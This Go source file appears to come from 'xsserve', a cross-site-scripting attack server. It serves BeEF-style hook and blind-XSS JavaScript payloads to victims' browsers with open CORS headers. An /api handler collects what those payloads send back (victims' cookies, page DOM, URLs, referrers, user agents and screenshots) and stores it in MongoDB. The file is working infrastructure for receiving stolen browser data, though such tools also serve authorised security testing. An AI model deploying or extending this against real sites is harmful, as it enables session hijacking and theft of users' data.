package server

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"

	"xsserve/core"
	"xsserve/database"

	"go.mongodb.org/mongo-driver/bson/primitive"
)

func ServeXSS(addr string, port int, https bool, cert, key string) (err error) {
	mux := http.NewServeMux()

	//redirectHandler := http.RedirectHandler("http://example.org", 307)
	//mux.Handle("/foo", rh)
	//notFoundHandler := http.NotFoundHandler()
	hook := http.HandlerFunc(hookHandle)
	blind := http.HandlerFunc(blindHandle)
	custom := http.HandlerFunc(customHandle)
	api := http.HandlerFunc(apiHandle)

	// Beef-like hook payload
	mux.Handle("/hook", hook)
	mux.Handle("/h", hook)

	// Blind XSS payload
	mux.Handle("/blind", blind)
	mux.Handle("/b", blind)
	mux.Handle("/", blind)

	// Custom JS payload
	mux.Handle("/custom", custom)
	mux.Handle("/c", custom)

	mux.Handle("/api", api)
	mux.Handle("/a", api)

	//TODO: fix, The script from “http://host/static/resources/ui/js/main.js” was loaded even though its MIME type (“text/plain”) is not a valid JavaScript MIME type.
	//mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.FS(StaticFS))))

	//TODO: check if HTTPS, then serve over TLS otherwise HTTP
	//TODO: if no certificates provided and HTTPS is enabled generate certificates
	_, err = tls.LoadX509KeyPair(cert, key)
	if err != nil && https {
		log.Println("Certificate or key file not found or invalid:", err)
		return
	}

	server := &http.Server{
		Addr:           fmt.Sprintf("%s:%d", addr, port),
		Handler:        mux,
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: 1 << 20,
	}

	if https {
		err = server.ListenAndServeTLS(cert, key)
	} else {
		err = server.ListenAndServe()
	}

	return err
}

func hookHandle(w http.ResponseWriter, r *http.Request) {
	log.Println("[HOOK] Received request from ", r.Host)

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")
	w.Header().Set("Content-type", "text/javascript")
	hook, err := StaticFS.ReadFile("resources/xss/hook.js")
	if err != nil {
		log.Println("Could not locate hook.js file:", err)
		log.Println(r)
		return
	}
	_, err = w.Write(hook)
	if err != nil {
		log.Println("Failed to write response:", err)
	}
}

func blindHandle(w http.ResponseWriter, r *http.Request) {
	log.Println("[BLIND] Received request from", r.Host)

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")
	w.Header().Set("Content-type", "text/javascript")
	blind, err := StaticFS.ReadFile("resources/xss/blind.js")
	if err != nil {
		log.Println("Could not locate blind.js file: ", err)
		log.Println(r)
		return
	}

	// TODO: use go templates instead?
	//blind = bytes.ReplaceAll(blind, "[HOST_NAME_REPLACEME]", "")
	_, err = w.Write(blind)
	if err != nil {
		log.Println("Failed to write response: ", err)
	}
}

func customHandle(w http.ResponseWriter, r *http.Request) {
	//TODO: based on a special id parameter injected in the blind payload script, this will load a different script
	log.Println("[CUSTOM] Received request from", r.Host)

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")
	w.Header().Set("Content-type", "text/javascript")
	custom := []byte("alert('custom')")

	_, err := w.Write(custom)
	if err != nil {
		log.Println("Failed to write response: ", err)
	}
}

func apiHandle(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")

	// Ignore OPTIONS or GET
	if r.Method == "OPTIONS" || r.Method == "GET" {
		return
	}

	log.Println("[API] Received data from trigger via", r.Method, "from: ", r.Host)
	//parse parameters
	var j map[string]string
	var t core.Trigger

	err := json.NewDecoder(r.Body).Decode(&j)
	defer r.Body.Close()
	if err != nil {
		log.Println("Failed to decode body:", err)
	}

	//TODO: this is VERY fugly code, rework it to be nicer from the json into the core.Trigger struct
	// Parse Cookies header
	header := http.Header{}
	header.Add("Cookie", j["Cookies"])
	request := http.Request{Header: header}
	t.ID = primitive.NewObjectID().Hex()
	t.Date = time.Now()
	t.Host = j["Host"]
	t.Payload = core.Payload{Code: j["Payload"]}
	t.Cookies = request.Cookies()
	t.URI = j["URI"]
	t.Referrer = j["Referrer"]
	t.UserAgent = j["UserAgent"]
	browserDate, err := strconv.ParseInt(j["BrowserDate"], 10, 64)
	if err != nil {
		log.Println("Failed to decode BrowserDate:", err)
	}
	t.BrowserDate = time.Unix(browserDate, 0)
	t.UID, err = strconv.Atoi(j["UID"])
	if err != nil {
		log.Println("Failed to decode UID:", err)
		t.UID = -1
	}
	t.Origin = j["Origin"]
	t.DOM = j["DOM"]

	// Save the image as bytes so we can serve it later via /get/screenshot
	b64data := j["Screenshot"][strings.IndexByte(j["Screenshot"], ',')+1:]
	t.Screenshot, _ = base64.StdEncoding.DecodeString(b64data)

	insertResult, err := database.DB.Collection("triggers").InsertOne(database.CTX, &t)
	if err != nil {
		log.Println("Failed to insert into database:", err)
	}

	log.Println("Inserted into db:", insertResult)
}
